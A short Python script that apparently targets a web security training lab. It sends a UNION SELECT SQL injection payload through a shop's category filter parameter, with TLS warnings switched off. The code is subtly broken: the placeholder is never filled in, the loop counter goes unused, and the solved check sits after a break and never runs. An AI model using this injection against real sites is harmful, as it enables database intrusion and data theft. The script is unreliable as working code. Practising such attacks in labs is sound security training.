import sys
import logging
import argparse
import urllib3

import requests

import utils
from shop import Shop

log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}] [{levelname}] [{name}] {message}",
    style="{", 
    datefmt="%H:%M:%S",
)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def main(args):
    shop = Shop()
    count = 1;
    for i in range(1,51):
        filter_path = "filter?category=' UNION SELECT {nulls}-- "
        response = requests.get(shop.base_url + filter_path)
        if response.status_code == 200:
            break
            shop.is_solved()
    
if __name__ == "__main__":
    args=utils.parse_args(sys.argv)
    main(args)